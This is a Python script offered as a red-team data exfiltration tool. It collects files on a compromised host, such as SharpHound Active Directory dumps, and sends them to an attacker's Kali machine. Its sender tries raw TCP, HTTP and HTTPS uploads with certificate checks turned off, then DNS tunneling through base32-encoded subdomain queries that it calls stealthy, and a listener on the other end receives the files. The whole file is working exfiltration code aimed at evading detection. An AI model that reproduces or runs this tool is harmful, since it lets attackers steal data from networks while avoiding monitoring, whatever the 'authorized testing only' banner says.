#!/usr/bin/env python3
"""
🔁 Data Exfiltration & Tunneling Tool
Securely transfer files from target to Kali for authorized testing
Author: Professional Red Teamer
"""

import socket
import threading
import ssl
import zipfile
import os
import hashlib
import base64
import argparse
from datetime import datetime
import sys

class DataExfiltrator:
    def __init__(self, kali_ip, kali_port=4444, encryption_key=None):
        self.kali_ip = kali_ip
        self.kali_port = kali_port
        self.encryption_key = encryption_key or "default-key-change-in-production"
        
    def simple_encrypt(self, data):
        """Simple XOR encryption for basic obfuscation"""
        key = self.encryption_key.encode()
        encrypted = bytearray()
        for i, byte in enumerate(data):
            encrypted.append(byte ^ key[i % len(key)])
        return bytes(encrypted)
    
    def create_zip_with_files(self, files_to_zip, zip_name="collected_data.zip"):
        """Create a zip file with collected data"""
        print(f"[+] Creating zip archive: {zip_name}")
        
        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file_path in files_to_zip:
                if os.path.exists(file_path):
                    arcname = os.path.basename(file_path)
                    zipf.write(file_path, arcname)
                    print(f"[+] Added to zip: {file_path}")
                else:
                    print(f"[-] File not found: {file_path}")
        
        return zip_name
    
    def calculate_file_hash(self, filename):
        """Calculate MD5 hash of file"""
        hash_md5 = hashlib.md5()
        with open(filename, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                hash_md5.update(chunk)
        return hash_md5.hexdigest()
    
    def send_file_http(self, filename):
        """Send file using HTTP POST (evade basic detection)"""
        print(f"[+] Sending file via HTTP to {self.kali_ip}:{self.kali_port}")
        
        try:
            import requests
        except ImportError:
            print("[-] requests module required. Install with: pip install requests")
            return False
        
        try:
            with open(filename, 'rb') as f:
                files = {'file': (os.path.basename(filename), f)}
                response = requests.post(
                    f"http://{self.kali_ip}:{self.kali_port}/upload",
                    files=files,
                    timeout=30
                )
            
            if response.status_code == 200:
                print("[✅] File sent successfully via HTTP")
                return True
            else:
                print(f"[-] HTTP transfer failed: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[-] HTTP transfer failed: {e}")
            return False
    
    def send_file_raw_tcp(self, filename):
        """Send file using raw TCP socket"""
        print(f"[+] Sending file via TCP to {self.kali_ip}:{self.kali_port}")
        
        try:
            with open(filename, 'rb') as f:
                file_data = f.read()
            
            # Create socket and connect
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((self.kali_ip, self.kali_port))
            
            # Send file size first
            file_size = len(file_data)
            sock.sendall(file_size.to_bytes(8, byteorder='big'))
            
            # Send file data
            sock.sendall(file_data)
            sock.close()
            
            print("[✅] File sent successfully via TCP")
            return True
            
        except Exception as e:
            print(f"[-] TCP transfer failed: {e}")
            return False
    
    def send_file_https(self, filename):
        """Send file using HTTPS (encrypted)"""
        print(f"[+] Sending file via HTTPS to {self.kali_ip}:{self.kali_port}")
        
        try:
            import requests
        except ImportError:
            print("[-] requests module required")
            return False
        
        try:
            with open(filename, 'rb') as f:
                files = {'file': (os.path.basename(filename), f)}
                response = requests.post(
                    f"https://{self.kali_ip}:{self.kali_port}/upload",
                    files=files,
                    verify=False,  # Skip cert verification for testing
                    timeout=30
                )
            
            if response.status_code == 200:
                print("[✅] File sent successfully via HTTPS")
                return True
            else:
                print(f"[-] HTTPS transfer failed: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[-] HTTPS transfer failed: {e}")
            return False
    
    def dns_tunnel_data(self, filename):
        """Exfiltrate data via DNS queries (stealthy)"""
        print(f"[+] Attempting DNS tunneling to {self.kali_ip}")
        
        try:
            import dns.resolver
        except ImportError:
            print("[-] dnspython required. Install with: pip install dnspython")
            return False
        
        try:
            with open(filename, 'rb') as f:
                data = f.read()
            
            # Encode data in base32 for DNS
            encoded_data = base64.b32encode(data).decode().lower()
            
            # Split into chunks that fit in DNS labels
            chunk_size = 50
            chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
            
            print(f"[+] Sending {len(chunks)} DNS chunks...")
            
            for i, chunk in enumerate(chunks):
                domain = f"{chunk}.exfil.{self.kali_ip}"
                try:
                    dns.resolver.resolve(domain, 'A')
                    print(f"[{i+1}/{len(chunks)}] Sent chunk", end='\r')
                except:
                    # DNS server might not exist, but data is in queries
                    pass
            
            print(f"\n[✅] DNS tunneling attempt completed")
            return True
            
        except Exception as e:
            print(f"[-] DNS tunneling failed: {e}")
            return False
    
    def transfer_sharphound_data(self, sharphound_zip_path):
        """Specialized function for transferring SharpHound data"""
        if not os.path.exists(sharphound_zip_path):
            print(f"[-] SharpHound file not found: {sharphound_zip_path}")
            return False
        
        print(f"[🚀] Transferring SharpHound data: {sharphound_zip_path}")
        
        file_size = os.path.getsize(sharphound_zip_path)
        file_hash = self.calculate_file_hash(sharphound_zip_path)
        
        print(f"[📊] File Info: {file_size} bytes, MD5: {file_hash}")
        
        # Try multiple methods
        methods = [
            self.send_file_raw_tcp,
            self.send_file_http,
            self.send_file_https,
            self.dns_tunnel_data
        ]
        
        for method in methods:
            print(f"\n[🔄] Trying {method.__name__}...")
            if method(sharphound_zip_path):
                return True
        
        print("[-] All transfer methods failed")
        return False

class DataReceiver:
    """Receiver to run on Kali Linux"""
    
    def __init__(self, listen_port=4444, output_dir="received_files"):
        self.listen_port = listen_port
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
    
    def start_tcp_receiver(self):
        """Start TCP file receiver"""
        print(f"[👂] Listening for TCP connections on port {self.listen_port}")
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', self.listen_port))
        sock.listen(1)
        
        while True:
            try:
                conn, addr = sock.accept()
                print(f"[📥] Connection from {addr}")
                
                # Receive file size
                file_size_bytes = conn.recv(8)
                if not file_size_bytes:
                    continue
                
                file_size = int.from_bytes(file_size_bytes, byteorder='big')
                print(f"[📊] Receiving file of size: {file_size} bytes")
                
                # Receive file data
                received_data = b''
                while len(received_data) < file_size:
                    chunk = conn.recv(min(4096, file_size - len(received_data)))
                    if not chunk:
                        break
                    received_data += chunk
                
                # Save file
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = os.path.join(self.output_dir, f"received_{timestamp}.bin")
                
                with open(filename, 'wb') as f:
                    f.write(received_data)
                
                print(f"[✅] File saved: {filename} ({len(received_data)} bytes)")
                conn.close()
                
            except KeyboardInterrupt:
                print("\n[⏹️] Stopping receiver...")
                break
            except Exception as e:
                print(f"[-] Receiver error: {e}")
                continue
        
        sock.close()

def main():
    parser = argparse.ArgumentParser(description='Data Exfiltration Tool')
    parser.add_argument('--mode', choices=['send', 'receive'], required=True,
                       help='Mode: send from target or receive on Kali')
    parser.add_argument('--kali-ip', help='Kali Linux IP address')
    parser.add_argument('--kali-port', type=int, default=4444, help='Kali listening port')
    parser.add_argument('--file', help='File to transfer')
    parser.add_argument('--sharphound', help='Path to SharpHound zip file')
    
    args = parser.parse_args()
    
    if args.mode == 'send':
        if not args.kali_ip:
            print("[-] Please specify --kali-ip for send mode")
            sys.exit(1)
        
        exfil = DataExfiltrator(args.kali_ip, args.kali_port)
        
        if args.sharphound:
            exfil.transfer_sharphound_data(args.sharphound)
        elif args.file:
            exfil.transfer_sharphound_data(args.file)
        else:
            print("[-] Please specify --file or --sharphound to transfer")
    
    elif args.mode == 'receive':
        receiver = DataReceiver(args.kali_port)
        receiver.start_tcp_receiver()

if __name__ == "__main__":
    print("""
    🔁 DATA EXFILTRATION TOOL
    ==========================
    For authorized penetration testing only!
    """)
    main()